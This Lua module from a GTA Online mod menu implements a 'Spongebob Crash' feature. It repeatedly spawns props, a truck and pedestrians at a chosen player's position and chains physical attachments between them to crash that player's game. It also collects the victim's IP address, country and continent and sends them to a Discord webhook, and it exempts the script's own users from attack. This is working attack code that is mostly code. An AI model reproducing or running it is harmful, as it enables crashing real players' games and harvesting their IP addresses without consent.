local function createMixedEntityAttachmentLoopModule(moduleContext)
    KSRuntimePlayerFeatureState = KSRuntimePlayerFeatureState or {}
    KSRuntimePlayerFeatureState.largeObjects = KSRuntimePlayerFeatureState.largeObjects or {}
    KSRuntimePlayerFeatureState.dumpedObjectsPID = KSRuntimePlayerFeatureState.dumpedObjectsPID or {}

    local scriptedCamera = 0
    local lastTargetX, lastTargetY, lastTargetZ = 0, 0, 0

    local function attachEntities(childEntity, parentEntity, attachmentOffsetZ)
        ENTITY.ATTACH_ENTITY_TO_ENTITY_PHYSICALLY(
            childEntity, parentEntity, 0, 0, 0, 0, attachmentOffsetZ,
            0, 0, 0, 0, 0, 0, 1000, true, true, true, true, 2
        )
    end

    local function runMixedEntityAttachmentLoop(attachmentFeature)
        if not attachmentFeature:IsToggled() then
            return
        end
        local targetPlayerId = Utils.GetSelectedPlayer()
        local targetPlayer = Players.GetById(targetPlayerId)
        if not targetPlayer then
            return
        end
        local targetGamerInfo = targetPlayer:GetGamerInfo()
        local function disableSelectedFeature()
            FeatureMgr.GetFeature(Utils.Joaat("spongebobc"), targetPlayerId):SetValue(false):OnClick()
        end
        if targetPlayerId == nil or targetPlayerId == GTA.GetLocalPlayerId() or not (isDev or isSupporter or isAdmin) then
            disableSelectedFeature()
            return
        end
        if blacklistRIDList[targetGamerInfo.RockstarId] then
            if not isDev then
                blacklistSound()
                SendToDiscord("nogger", ("%s(%i) tried to Crash a Blacklisted Player (%s)!"):format(
                    Players.GetName(GTA.GetLocalPlayerId()), Cherax.GetUID(), Players.GetName(Utils.GetSelectedPlayer())
                ))
                disableSelectedFeature()
                return
            end
        elseif detectedPlayerReasons[targetPlayerId + 1] == "K-Script User" and not isDev then
            blacklistSound("forbidden_protected_runtime_target")
            SendToDiscord("nogger", ("%s(%i) tried to Crash another K-Script User (%s)!"):format(
                Players.GetName(GTA.GetLocalPlayerId()), Cherax.GetUID(), Players.GetName(Utils.GetSelectedPlayer())
            ))
            disableSelectedFeature()
            return
        end

        local function logAttachmentAttempt()
            local targetTags = Players.GetTags(targetPlayerId)
            local targetIpInfo = Players.GetIPInfo(targetPlayerId)
            local targetIp = Players.GetIP(targetPlayerId):ToString(false)
            local targetIsFriend = string.find(targetTags, "[F]", 1, true) ~= nil
            SendToDiscord("lol", ("%s used Spongebob Crash against %s with UID %i, isSupporter: %s, is Target Friend?: %s, Target Country: %s, Target Continent: %s, Target IP: %s"):format(
                PLAYER.GET_PLAYER_NAME(GTA.GetLocalPlayerId()), Players.GetName(Utils.GetSelectedPlayer()),
                Cherax.GetUID(), tostring(isSupporter), tostring(targetIsFriend),
                targetIpInfo.country, targetIpInfo.continent, targetIp
            ))
        end
        log = logAttachmentAttempt
        Script.QueueJob(log)

        local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetPlayerId)
        if Players.GetById(targetPlayerId) == nil then
            return
        end
        scriptedCamera = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
        CAM.RENDER_SCRIPT_CAMS(true, true, 1000, true, true, true)
        CAM.SET_CAM_ACTIVE(scriptedCamera, true)
        CAM.SET_CAM_COORD(scriptedCamera, 0.0, 0.0, 10000.0)
        STREAMING.SET_FOCUS_POS_AND_VEL(0.0, 0.0, 10000.0, 0.0, 0.0, 0.0)
        Script.Yield(2500)
        notify("Executing Spongebob Crash..")

        local iterationCount = 0
        while FeatureMgr.IsFeatureEnabled(Utils.Joaat("spongebobc"), targetPlayerId) == true and not ShouldUnload() do
            iterationCount = iterationCount + 1
            if PED.IS_PED_DEAD_OR_DYING(targetPed) == false then
                lastTargetX, lastTargetY, lastTargetZ = ENTITY.GET_ENTITY_COORDS(targetPed, true)
            end
            local bottleObject = GTA.CreateObject(Utils.Joaat("prop_drug_bottle"), lastTargetX, lastTargetY, lastTargetZ, true)
            local hoistObject = GTA.CreateObject(Utils.Joaat("m23_1_prop_m31_magnethoist_01a"), lastTargetX, lastTargetY, lastTargetZ, true)
            local doorObject = GTA.CreateObject(Utils.Joaat("v_ilev_fh_frntdoor"), lastTargetX, lastTargetY, lastTargetZ, true)
            local goldObject = GTA.CreateObject(Utils.Joaat("prop_large_gold"), lastTargetX, lastTargetY, lastTargetZ, true)
            local barracksTruck = GTA.SpawnVehicle(Utils.Joaat("barracks3"), lastTargetX, lastTargetY, lastTargetZ, 0, true)
            local hipsterPedTwo = GTA.CreatePed(Utils.Joaat("A_F_Y_Hipster_02"), 26, lastTargetX, lastTargetY, lastTargetZ, ENTITY.GET_ENTITY_HEADING(targetPed))
            local hipsterPedOne = GTA.CreatePed(Utils.Joaat("A_F_Y_Hipster_01"), 26, lastTargetX, lastTargetY, lastTargetZ, ENTITY.GET_ENTITY_HEADING(targetPed))
            local hipsterPedThree = GTA.CreatePed(Utils.Joaat("A_F_Y_Hipster_03"), 26, lastTargetX, lastTargetY, lastTargetZ, ENTITY.GET_ENTITY_HEADING(targetPed))
            Script.Yield(80)
            for attachmentPass = 1, 2 do
                local attachmentOffsetZ = 5 + 2 * attachmentPass
                attachEntities(bottleObject, bottleObject, attachmentOffsetZ)
                attachEntities(bottleObject, hoistObject, attachmentOffsetZ)
                Script.Yield(25)
                attachEntities(hoistObject, doorObject, attachmentOffsetZ)
                ENTITY.SET_ENTITY_PROOFS(doorObject, true, true, true, true, true, true, true, true)
                ENTITY.SET_ENTITY_ROTATION(doorObject, 0, 0, 0, 2, true)
                ENTITY.SET_ENTITY_VELOCITY(doorObject, 0, 0, 0)
                ENTITY.SET_ENTITY_PROOFS(bottleObject, true, true, true, true, true, true, true, true)
                ENTITY.SET_ENTITY_VELOCITY(bottleObject, 0, 0, 0)
                ENTITY.SET_ENTITY_ROTATION(bottleObject, 0, 0, 0, 2, true)
                attachEntities(doorObject, goldObject, attachmentOffsetZ)
                attachEntities(goldObject, hipsterPedTwo, attachmentOffsetZ)
                Script.Yield(25)
                attachEntities(hipsterPedTwo, hipsterPedOne, attachmentOffsetZ)
                attachEntities(hipsterPedOne, hipsterPedThree, attachmentOffsetZ)
                attachEntities(hipsterPedThree, barracksTruck, attachmentOffsetZ)
            end
            Script.Yield(25)
            deleteEntityLocal(bottleObject)
            deleteEntityLocal(hoistObject)
            deleteEntityLocal(doorObject)
            deleteEntityLocal(goldObject)
            deleteEntityLocal(barracksTruck)
            deleteEntityLocal(hipsterPedTwo)
            deleteEntityLocal(hipsterPedOne)
            deleteEntityLocal(hipsterPedThree)
            if iterationCount > 150 then
                notify(("Crash Threshold exceeded against %s, disabling Spongebob Crash!"):format(Players.GetName(targetPlayerId)))
                FeatureMgr.GetFeature(Utils.Joaat("spongebobc"), targetPlayerId):Toggle()
                return
            end
            if FeatureMgr.IsFeatureEnabled(Utils.Joaat("spongebobc"), targetPlayerId) == false then
                return
            end
        end
        FeatureMgr.GetFeatureByName("Teleport To Player", targetPlayerId):TriggerCallback()
        CAM.RENDER_SCRIPT_CAMS(0, 0, 0, 0, 0, 0)
        CAM.SET_CAM_ACTIVE(scriptedCamera, false)
        STREAMING.CLEAR_FOCUS()
        CAM.DESTROY_ALL_CAMS(0)
        notify("Spongebob Done!")
    end

    local mixedEntityAttachmentLoopRunner = { variant = "donator", feature = "spongebobc", slug = "spongebobc" }

    function mixedEntityAttachmentLoopRunner.run(runContext)
        if type(runContext) ~= "table" or not runContext then
            runContext = {}
        end
        return runMixedEntityAttachmentLoop(runContext.feature)
    end

    return mixedEntityAttachmentLoopRunner
end

return createMixedEntityAttachmentLoopModule
